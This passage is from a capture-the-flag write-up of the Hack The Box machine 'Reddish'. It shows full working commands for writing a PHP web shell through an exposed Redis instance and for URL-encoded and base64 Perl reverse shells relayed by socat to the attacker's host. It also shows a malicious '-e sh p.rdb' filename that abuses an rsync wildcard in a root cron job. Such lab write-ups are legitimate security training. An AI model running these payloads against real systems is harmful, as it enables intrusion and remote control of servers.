*</span><br><span class="line">							* 1. Share the web folder with the database container (Done)</span><br><span class="line">							* 2. Add here the code to backup databases <span class="keyword">in</span> /f187a0ec71ce99642e4f0afbd441a68b folder</span><br><span class="line">							* ...Still don<span class="string">&#x27;t know how to complete it...</span></span><br><span class="line"><span class="string">						*/</span></span><br><span class="line"><span class="string">						function backupDatabase() &#123;</span></span><br><span class="line"><span class="string">								$.ajax(&#123;</span></span><br><span class="line"><span class="string">										url: &quot;8924d0549008565c554f8128cd11fda4/ajax.php?backup=...&quot;,</span></span><br><span class="line"><span class="string">										cache: false,</span></span><br><span class="line"><span class="string">										dataType: &quot;text&quot;,</span></span><br><span class="line"><span class="string">										success: function (data) &#123;</span></span><br><span class="line"><span class="string">											console.log(&quot;Database saved:&quot;, data);</span></span><br><span class="line"><span class="string">										&#125;,</span></span><br><span class="line"><span class="string">										error: function () &#123;</span></span><br><span class="line"><span class="string">										&#125;</span></span><br><span class="line"><span class="string">								&#125;);</span></span><br><span class="line"><span class="string">						&#125;</span></span><br><span class="line"><span class="string">		&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;This is the default web page for this server.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>There’s two important take-aways from this source:</p>
<ul>
<li><p>1.There are ajax calls to 8924d0549008565c554f8128cd11fda4&#x2F;ajax.php. Based on the parameters values for the text of get hits and incr hits (which look like redis commands), I can hypothesize that these commands are executed on the redis database.</p>
</li>
<li><p>There’s some self-proclaimed incomplete code having to do with backing up that database. It does indicate that the web folder is shared with the database container.</p>
</li>
</ul>
<p>I can also test out these function in the firefox debug console:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">13:17:49.521 getData()</span><br><span class="line">13:17:49.668 undefined</span><br><span class="line">13:17:51.757 Number of hits: 1 127.0.0.1:19:20</span><br><span class="line">13:17:59.877 incrCounter()</span><br><span class="line">13:17:59.884 undefined</span><br><span class="line">13:18:05.446 getData()</span><br><span class="line">13:18:05.453 undefined</span><br><span class="line">13:18:07.953 Number of hits: 2</span><br></pre></td></tr></table></figure>

<p>What about trying to exercise the backup function? Visiting</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/ajax.php?backup=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>eventually has a timeout, which makes sense since the comments said it was not yet implemented:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught Exception: Cant <span class="built_in">read</span> line from socket. <span class="keyword">in</span> /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php:74 Stack trace: <span class="comment">#0 /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php(101): Client-&gt;readLine() #1 /var/www/html/8924d0549008565c554f8128cd11fda4/ajax.php(9): Client-&gt;sendCmd(NULL) #2 &#123;main&#125; thrown in /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php on line 74</span></span><br></pre></td></tr></table></figure>

<p>This error message does give me the absolute web path, which is the default apache path</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>

<h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><p>So I can do some interaction with the database through the website and JavaScript… But I can also interact directly with the Redis database.<br>Just like with www, I’ll use meterpreter to set up a tunnel into the subnet with www and redis:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 6379 -r 172.19.0.4 -p 6379</span><br><span class="line">[*] Local TCP relay created: :6379 &lt;-&gt; 172.19.0.4:6379</span><br></pre></td></tr></table></figure>

<p>do basic enumeration with nc:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 127.0.0.1 6379</span></span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">2</span><br><span class="line">incr hits</span><br><span class="line">:3</span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">3</span><br><span class="line">incr hits</span><br><span class="line">:4</span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>install redis-cli for interaction with the db:</p>
<p>apt-get install redis-tools</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># redis-cli   # by default, connects to localhost 6379</span></span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">(0.58s)</span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">(0.57s)</span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 7</span><br><span class="line">(0.58s)</span><br><span class="line">127.0.0.1:6379&gt; get hits</span><br><span class="line"><span class="string">&quot;7&quot;</span></span><br><span class="line">(0.63s)</span><br></pre></td></tr></table></figure>

<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p><span class="exturl" data-url="aHR0cHM6Ly9wYWNrZXRzdG9ybXNlY3VyaXR5LmNvbS9maWxlcy8xMzQyMDAvUmVkaXMtUmVtb3RlLUNvbW1hbmQtRXhlY3V0aW9uLmh0bWw=">This post<i class="fa fa-external-link-alt"></i></span> on PacketStorm details how I can use Redis to write arbitrary files on disk. I can flush the database, write some data into it, and then back it up to a target location. The article talks about writing an SSH key. SSH isn’t enabled here, but, because I know that the database server shares disk space with www, I can write a web shell.</p>
<ul>
<li>Exploit Limitations</li>
</ul>
<p>This isn’t by any means perfect. For example, the database will compress repeated text patterns, so could I lose some of the text I want to write. So for example, when I tried to write <br/> into multiple places in a php file, only the first actually made it through as desired. Even if I tried using <br/> and <br />, the second &lt;br was replaced with binary data. Similarly, when I wrote a command to get a perl reverse shell, the pattern ,”&gt;&amp;S”); was replaced and thus broke the script.</p>
<ul>
<li>Exploit to WebShell<br>Luckily for me, I can write a simple php webshell, and there’s no repeats, and php doesn’t care about garbage before or after the shell.</li>
</ul>
<p>Steps (all in redis-cli):</p>
<ul>
<li>flush the database</li>
<li>write shell to database</li>
<li>set directory</li>
<li>set filename</li>
<li>save</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat redis.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># redis-cli -h 127.0.0.1  flushall</span></span><br><span class="line">OK</span><br><span class="line">root@kali:~<span class="comment"># cat redis.txt | redis-cli -x set crackit</span></span><br><span class="line">OK</span><br><span class="line">root@kali:~<span class="comment"># redis-cli</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/8924d0549008565c554f8128cd11fda4/</span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">&quot;df.php&quot;</span></span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">(0.58s)</span><br></pre></td></tr></table></figure>

<p>Now check out <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS84OTI0ZDA1NDkwMDg1NjVjNTU0ZjgxMjhjZDExZmRhNC9kZi5waHA/Y21kPWlk">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=id<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�&#125;_�used-mem¨? �aof-preamble���crackit+ uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data) ��Z<span class="string">&quot;,���</span></span><br></pre></td></tr></table></figure>

<p>hostname shows the host is named www:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�&#125;_�used-mem¨? �aof-preamble���crackit+ www ��Z<span class="string">&quot;,���</span></span><br></pre></td></tr></table></figure>

<h3 id="Script-Redis-WebShell"><a href="#Script-Redis-WebShell" class="headerlink" title="Script Redis WebShell"></a>Script Redis WebShell</h3><p>The files in the web directory seem to be cleared out every 3 minutes (I’ll confirm this soon), so scripted the upload:</p>
<p>upload_shell.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 flushall</span><br><span class="line"><span class="built_in">cat</span> redis.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 127.0.0.1 config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/8924d0549008565c554f8128cd11fda4/</span><br><span class="line">redis-cli -h 127.0.0.1 config <span class="built_in">set</span> dbfilename <span class="string">&quot;df.php&quot;</span></span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br></pre></td></tr></table></figure>

<p>then run the script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># ./upload_shell.sh </span></span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h3 id="Interactive-Shell"><a href="#Interactive-Shell" class="headerlink" title="Interactive Shell"></a>Interactive Shell</h3><ul>
<li>Connectivity socat</li>
</ul>
<p>It doesn’t look like I can connect all the back to kali from this host. which ping returns &#x2F;bin&#x2F;ping, but trying to ping 10.10.14.9 doesn’t result in anything when watching in tcpdump. When I try to ping 172.19.0.3 (nodered), I get results</p>
<p>So I need to pivot through nodered. I’ll upload a static copy of socat to the box using the Node-Red flow for upload. Now I can use socat one of two ways:</p>
<ul>
<li>Relay traffic through nodered back to kali</li>
<li>Catch the callback on nodered</li>
</ul>
<p>do the first one, so in the shell on nodered, create a tunnel:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/tmp</span><br><span class="line"><span class="comment"># ./socat tcp-listen:223,fork tcp:10.10.14.9:223 &amp;</span></span><br></pre></td></tr></table></figure>

<p>That will run in the background, and forward any traffic that hits port 223 on nodered to my workstation on port 223.</p>
<ul>
<li>Execution<br>And, like nodered, there’s a limited toolset available. Luckily, perl is still present (a phrase I never thought I’d say).</li>
</ul>
<p>To get this working, it took a fair amount of playing with the url encoding. In the end, I had success by visiting the following url in a browser:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=perl%20-e%20%27use%20Socket%3b<span class="variable">$i</span>%3d%22172.19.0.2%22%3b<span class="variable">$p</span>%3d223%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b&#125;%3b%27</span><br></pre></td></tr></table></figure>

<p>then we got the shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 223</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::223</span><br><span class="line">Ncat: Listening on 0.0.0.0:223</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:50210.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ ip addr</span></span><br><span class="line"><span class="string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span></span><br><span class="line"><span class="string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span></span><br><span class="line"><span class="string">    inet 127.0.0.1/8 scope host lo</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">13: eth1@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth1</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">$ ls -la</span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 5 root root 4096 Jul 15  2018 ..</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root    9 Jul 16  2018 .bash_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000  220 Apr 23  2018 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000 3771 Apr 23  2018 .bashrc</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000  655 Apr 23  2018 .profile</span></span><br><span class="line"><span class="string">-r-------- 1 1000 1000   33 Apr 23  2018 user.txt</span></span><br></pre></td></tr></table></figure>

<p>ajax.php, which shows the commands running at the redis server:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> ajax.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once <span class="string">&#x27;lib/Autoloader.php&#x27;</span>;</span><br><span class="line">Autoloader::register();</span><br><span class="line"><span class="variable">$json</span> = new JsonResult();</span><br><span class="line"><span class="variable">$config</span> = new Config();</span><br><span class="line">foreach (<span class="variable">$config</span>-&gt;getPool() as <span class="variable">$key</span> =&gt; <span class="variable">$server</span>) &#123;</span><br><span class="line">        <span class="variable">$client</span> = new Client(<span class="variable">$server</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$client</span>-&gt;sendCmd(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privesc-www-data-to-usertxt"><a href="#Privesc-www-data-to-usertxt" class="headerlink" title="Privesc www-data to usertxt"></a>Privesc www-data to usertxt</h2><h3 id="Identifying-Backup-Cron"><a href="#Identifying-Backup-Cron" class="headerlink" title="Identifying Backup Cron"></a>Identifying Backup Cron</h3><p>To get to user.txt, I’ll need to privesc. Looking around the box, there wasn’t a ton going on, so I decided to look for interesting processes starting and stopping. I’ve been a huge fan of pspy in the past for this, but since I’m two hops deep at this point, I’ll just using a bash script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IFS=$<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">old=$(ps -eo <span class="built_in">command</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    new=$(ps -eo <span class="built_in">command</span>)</span><br><span class="line">    diff &lt;(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$old</span>&quot;</span>) &lt;(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new</span>&quot;</span>) | grep [\&lt;\&gt;]</span><br><span class="line">    <span class="built_in">sleep</span> .3</span><br><span class="line">    old=<span class="variable">$new</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>Running it shows some interesting scripts being run about every 3 minutes:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./proc.sh</span><br><span class="line">&gt; /usr/sbin/CRON</span><br><span class="line">&gt; /bin/sh -c sh /backup/backup.sh</span><br><span class="line">&gt; sh /backup/backup.sh</span><br><span class="line">&gt; rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line">&gt; rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br></pre></td></tr></table></figure>

<p>Looking at &#x2F;backup&#x2F;backup.sh, it is saving the database, then removing the web folders and bringing them back in from a host named backup:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /backup/backup.sh</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line">rsync -a *.rdb rsync://backup:873/src/rdb/</span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; <span class="built_in">rm</span> -rf /var/www/html/*</span><br><span class="line">rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line"><span class="built_in">chown</span> www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploiting the Wildcard</li>
</ul>
<p>I can exploit the command rsync -a *.rdb rsync:&#x2F;&#x2F;backup:873&#x2F;src&#x2F;rdb, specifically the wildcard character. Because of how Unix handles wildcards, I can create a file named -e sh p.rdb, and that will evaluate to run sh p.rdb. The technique is detailed <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVmZW5zZWNvZGUuY29tL3B1YmxpYy9EZWZlbnNlQ29kZV9Vbml4X1dpbGRDYXJkc19Hb25lX1dpbGQudHh0">here<i class="fa fa-external-link-alt"></i></span>.</p>
<p>I’ll first set up a tunnel on nodered:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./socat tcp-listen:9010,fork tcp:10.10.14.9:9010 &amp;</span></span><br></pre></td></tr></table></figure>

<p>Now write a perl reverse shell into a file and create the other file to run it. I’ll use base64 to easily move small files back and forth:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># cat shell.txt </span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.19.0.2&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># cat shell.txt | base64</span></span><br><span class="line">cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9J</span><br><span class="line">TkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2th</span><br><span class="line">ZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQs</span><br><span class="line">Ij4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg==</span><br></pre></td></tr></table></figure>

<p>I’ll create my reverse shell script as p.rdb, and then create the file that will call that abusing the wildcard with touch:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | <span class="built_in">base64</span> -d &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb</span><br><span class="line">$ <span class="built_in">touch</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb</span><br></pre></td></tr></table></figure>

<p>When the cron runs, I’ll catch a callback as root on www when the backup script runs:</p>
<p>and grab user.txt:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9010</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9010</span><br><span class="line">Ncat: Listening on 0.0.0.0:9010</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:54802.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># pwd</span></span><br><span class="line"><span class="string">/var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span></span><br><span class="line"><span class="string"># cd /home</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">bergamotto</span></span><br><span class="line"><span class="string">lost+found</span></span><br><span class="line"><span class="string">somaro</span></span><br><span class="line"><span class="string"># cd somaro</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string"># cat user.txt</span></span><br><span class="line"><span class="string">c09aca7cb02c968b1e9637d51661f129</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb54.jpg"></li>
</ul>
<h3 id="File-Upload-to-www"><a href="#File-Upload-to-www" class="headerlink" title="File Upload to www"></a>File Upload to www</h3><p>To move to the next steps, I’ll want to get files uploaded to www, which is challenging without curl, wget, or nc. Here’s how I do it:</p>
<p>Start a tunnel on nodered that will listen (in this case on 8080) and forward that to my host:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./socat TCP-LISTEN:8080,fork TCP:10.10.14.9:8888 &amp;</span></span><br></pre></td></tr></table></figure>

<p>Use perl to request file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># perl -e &#x27;use File::Fetch; my $url = &quot;http://172.19.0.2:8080/socat&quot;; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Serve from workstation:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python3 -m http.server 8888</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span><br><span class="line">10.10.10.94 - - [25/Jul/2020 16:39:20] <span class="string">&quot;GET /socat HTTP/1.1&quot;</span> 304 -</span><br></pre></td></tr></table></figure>

